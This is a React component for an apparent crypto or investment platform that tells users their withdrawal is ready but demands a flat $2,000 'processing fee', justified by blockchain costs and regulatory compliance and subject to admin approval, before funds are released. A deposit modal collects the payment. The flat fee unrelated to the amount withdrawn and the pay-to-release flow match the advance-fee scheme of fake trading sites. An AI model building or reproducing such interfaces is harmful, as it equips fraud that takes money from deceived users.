import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { AlertCircle, DollarSign } from "lucide-react";
import { useState } from "react";
import { DepositModal } from "./DepositModal";

interface WithdrawalFeeNoticeProps {
  withdrawalAmount: number;
  asset: string;
  withdrawalId: string;
  onFeePaymentInitiated?: () => void;
}

export function WithdrawalFeeNotice({
  withdrawalAmount,
  asset,
  withdrawalId,
  onFeePaymentInitiated,
}: WithdrawalFeeNoticeProps) {
  const [showDepositModal, setShowDepositModal] = useState(false);

  return (
    <>
      <Card className="p-6 bg-gradient-to-br from-orange-50 to-yellow-50 dark:from-orange-950/20 dark:to-yellow-950/20 border-2 border-orange-300 dark:border-orange-700">
        <div className="flex items-start gap-4">
          <div className="p-3 bg-orange-100 dark:bg-orange-900/50 rounded-full">
            <AlertCircle className="h-6 w-6 text-orange-600 dark:text-orange-400" />
          </div>
          
          <div className="flex-1 space-y-4">
            <div>
              <h3 className="text-lg font-semibold text-orange-900 dark:text-orange-100 mb-2">
                Processing Fee Required
              </h3>
              <p className="text-sm text-orange-800 dark:text-orange-200">
                Your withdrawal of <strong>${withdrawalAmount.toLocaleString()} {asset}</strong> is ready!
              </p>
              <p className="text-sm text-orange-800 dark:text-orange-200 mt-2">
                To release your funds, a one-time processing fee of <strong>$2,000</strong> is required.
                This covers blockchain transaction costs and regulatory compliance.
              </p>
            </div>

            <div className="bg-white dark:bg-gray-900/50 rounded-lg p-4 border border-orange-200 dark:border-orange-800">
              <h4 className="font-medium text-sm mb-2 flex items-center gap-2">
                <DollarSign className="h-4 w-4" />
                How to Pay the Processing Fee:
              </h4>
              <ol className="text-sm text-muted-foreground space-y-1 ml-6 list-decimal">
                <li>Click "Pay Processing Fee" below</li>
                <li>Submit a deposit for $2,000</li>
                <li>Wait for admin approval (within 24 hours)</li>
                <li>Your withdrawal will be processed automatically</li>
              </ol>
            </div>

            <Button
              onClick={() => {
                setShowDepositModal(true);
                onFeePaymentInitiated?.();
              }}
              className="w-full sm:w-auto bg-orange-600 hover:bg-orange-700"
            >
              Pay Processing Fee ($2,000)
            </Button>
          </div>
        </div>
      </Card>

      <DepositModal
        open={showDepositModal}
        onOpenChange={setShowDepositModal}
        onSuccess={() => {
          setShowDepositModal(false);
        }}
      />
    </>
  );
}
